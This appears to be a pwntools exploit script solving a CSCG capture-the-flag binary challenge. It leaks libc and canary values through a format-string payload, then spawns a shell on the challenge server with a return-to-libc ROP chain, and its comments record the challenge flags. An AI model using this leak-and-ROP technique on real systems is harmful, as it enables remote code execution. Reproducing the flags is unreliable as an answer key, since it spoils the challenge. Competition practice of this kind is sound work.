from pwn import *

elf = context.binary = ELF("./pwn3")
# context.log_level = "debug"
# log.info(ELF.path)
# p = process("./pwn3")
# p = remote("192.168.0.12", 9102)
p = remote("hax1.allesctf.net", 9102)

print(p.recvuntil("Enter the password of stage 2:"))
print(p.sendline("CSCG{NOW_GET_VOLDEMORT}"))
# print(p.sendline("CSCG{THIS_IS_TEST_FLAG}"))

print(p.recvuntil("Enter your witch name:"))
format_str = "%p|" * 64
print(format_str)
p.sendline(format_str)

LEAKS = p.recvuntil("enter your magic spell:").split("|")
# for i,a in enumerate(LEAKS[1:]):
#   print '%2d -> %s' % (i + 1, a)


# the WIN function no longer calls system so we need to return to libc
LIBC_WRITE = int(LEAKS[2], 16)
LIBC_SYSTEM = LIBC_WRITE - 0xbbe37
LIBC_EXIT = LIBC_SYSTEM - 0xb7a0
# we also find the /bin/sh string inside libc
LIBC_SHELL = LIBC_SYSTEM + 0x161133

# the canary is leaked like in the previous challenge
canary = int(LEAKS[38], 16)
MAIN_LEAK = int(LEAKS[40], 16)
MAIN = MAIN_LEAK - 0x37
MAIN_RET = MAIN_LEAK + 0xc

PADDING = cyclic_find("cnaa") * "A"
# pwntools and ROPgadget find relative offsets to the start of the program memory area
# For POP_RDI the offset is 0xdf3, it's masked by another instruction
POP_RDI = MAIN + 0xac 

# rop = ROP(elf)
# log.info(rop.find_gadget("pop rdi"))
# log.info(rop.gadgets)
# rop.call(LIBC_SYSTEM, [LIBC_SHELL])
# log.info(rop.dump())

# raw_input("attach gdb")

exploit = "Expelliarmus\x00"
exploit += PADDING
exploit += p64(canary) + p64(0)
exploit += p64(POP_RDI) + p64(LIBC_SHELL)
exploit += p64(MAIN_RET) + p64(LIBC_SYSTEM)
exploit += p64(LIBC_EXIT)
p.sendline(exploit)

p.interactive()
# flag -> CSCG{VOLDEMORT_DID_NOTHING_WRONG}
